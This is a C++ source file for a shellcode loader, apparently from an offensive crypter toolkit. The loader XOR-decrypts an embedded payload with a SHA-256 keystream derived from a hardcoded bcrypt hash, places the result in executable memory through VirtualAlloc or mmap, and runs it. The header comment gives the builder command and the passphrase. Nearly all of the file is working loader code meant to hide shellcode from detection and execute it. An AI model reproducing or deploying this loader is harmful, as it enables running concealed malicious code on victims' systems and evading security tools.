/*
 * bcrypt_loader.cpp - bcrypt-KDF shellcode loader template
 * ========================================================
 * The builder derives a keystream from a bcrypt hash:
 *   keystream = concat( SHA256(hash || ctr_le32) ) for ctr = 0, 1, 2, ...
 * and XORs the shellcode with it. bcrypt itself is one-way: the loader
 * embeds the deterministic hash produced at build time from the
 * passphrase + salt (see payloads/bcrypt_300b.meta.json):
 *   passphrase : S3cr3tBcryptPass!
 *   salt       : $2b$10$.PGhLCTUX1gHkos6xb5t6.   (rounds = 10)
 *   hash       : $2b$10$.PGhLCTUX1gHkos6xb5t6.TRZEnsy7LE3L2D26dSiF53O6KpnY4KS
 *
 * Regenerate the payload include with the builder:
 *   shellcrypt.py -i shellcode.bin -m bcrypt -k 'S3cr3tBcryptPass!' \
 *       --salt 0112233445566778899aabbccddeeff0 --bcrypt-rounds 10 \
 *       --verify --meta params.json -f c -o payload_inc.h
 *
 * Compile: g++ -O2 -Wall -o bcrypt_loader bcrypt_loader.cpp
 */
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

#include "sha256_tables.inc" /* SHA256_K / SHA256_H0 (verified) */
#include "payload_inc.h"     /* kEncrypted[], kEncryptedLen, kOriginalLen */

/* 60-char bcrypt hash string produced by the builder (the effective key). */
static const char kHashStr[] =
    "$2b$10$.PGhLCTUX1gHkos6xb5t6.TRZEnsy7LE3L2D26dSiF53O6KpnY4KS";

/* ---------------------------- SHA-256 ---------------------------- */

static uint32_t rotr32(uint32_t x, unsigned n) { return (x >> n) | (x << (32 - n)); }

static void sha256(const uint8_t *msg, size_t len, uint8_t out[32]) {
    uint32_t h[8];
    memcpy(h, SHA256_H0, sizeof(h));

    size_t bitlen = len * 8;
    size_t padded = ((len + 8 + 63) / 64) * 64;
    uint8_t *buf = (uint8_t *)calloc(padded, 1);
    if (!buf) return;
    memcpy(buf, msg, len);
    buf[len] = 0x80;
    for (int i = 0; i < 8; i++) buf[padded - 1 - i] = (uint8_t)(bitlen >> (8 * i));

    for (size_t off = 0; off < padded; off += 64) {
        uint32_t w[64];
        for (unsigned i = 0; i < 16; i++)
            w[i] = ((uint32_t)buf[off + 4 * i] << 24) |
                   ((uint32_t)buf[off + 4 * i + 1] << 16) |
                   ((uint32_t)buf[off + 4 * i + 2] << 8) | buf[off + 4 * i + 3];
        for (unsigned i = 16; i < 64; i++) {
            uint32_t s0 = rotr32(w[i - 15], 7) ^ rotr32(w[i - 15], 18) ^ (w[i - 15] >> 3);
            uint32_t s1 = rotr32(w[i - 2], 17) ^ rotr32(w[i - 2], 19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16] + s0 + w[i - 7] + s1;
        }
        uint32_t a = h[0], b = h[1], c = h[2], d = h[3];
        uint32_t e = h[4], f = h[5], g = h[6], hh = h[7];
        for (unsigned i = 0; i < 64; i++) {
            uint32_t S1 = rotr32(e, 6) ^ rotr32(e, 11) ^ rotr32(e, 25);
            uint32_t ch = (e & f) ^ (~e & g);
            uint32_t t1 = hh + S1 + ch + SHA256_K[i] + w[i];
            uint32_t S0 = rotr32(a, 2) ^ rotr32(a, 13) ^ rotr32(a, 22);
            uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
            uint32_t t2 = S0 + maj;
            hh = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2;
        }
        h[0] += a; h[1] += b; h[2] += c; h[3] += d;
        h[4] += e; h[5] += f; h[6] += g; h[7] += hh;
    }
    for (unsigned i = 0; i < 8; i++) {
        out[4 * i] = (uint8_t)(h[i] >> 24);
        out[4 * i + 1] = (uint8_t)(h[i] >> 16);
        out[4 * i + 2] = (uint8_t)(h[i] >> 8);
        out[4 * i + 3] = (uint8_t)h[i];
    }
    free(buf);
}

/* --------------------------- keystream --------------------------- */

static void bcrypt_derive(uint8_t *out, size_t len) {
    const size_t hslen = sizeof(kHashStr) - 1;
    size_t made = 0;
    uint32_t ctr = 0;
    while (made < len) {
        uint8_t msg[64 + 4], dig[32];
        memcpy(msg, kHashStr, hslen);
        msg[hslen] = (uint8_t)(ctr & 0xff);
        msg[hslen + 1] = (uint8_t)((ctr >> 8) & 0xff);
        msg[hslen + 2] = (uint8_t)((ctr >> 16) & 0xff);
        msg[hslen + 3] = (uint8_t)((ctr >> 24) & 0xff);
        sha256(msg, hslen + 4, dig);
        size_t n = (len - made < 32) ? (len - made) : 32;
        memcpy(out + made, dig, n);
        made += n;
        ctr++;
    }
}

static void bcrypt_decrypt(const uint8_t *ct, uint8_t *pt, size_t len) {
    static uint8_t ks[4096];
    bcrypt_derive(ks, len);
    for (size_t i = 0; i < len; i++) pt[i] = ct[i] ^ ks[i];
}

static int run_payload(const uint8_t *p, size_t n) {
#ifdef _WIN32
    void *mem = VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc failed\n"); return -1; }
#else
    void *mem = mmap(NULL, n, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { printf("[-] mmap failed\n"); return -1; }
#endif
    memcpy(mem, p, n);
    int (*fn)() = (int (*)())mem;
    int r = fn();
#ifdef _WIN32
    VirtualFree(mem, 0, MEM_RELEASE);
#else
    munmap(mem, n);
#endif
    return r;
}

int main(void) {
    static uint8_t plain[4096];
    if (kEncryptedLen > sizeof(plain)) return 1;
    bcrypt_decrypt(kEncrypted, plain, kEncryptedLen);
    printf("[+] bcrypt decrypted %u bytes (hash %s)\n", kEncryptedLen, kHashStr);
    int r = run_payload(plain, kEncryptedLen);
    printf("[+] payload returned %d\n", r);
    return 0;
}
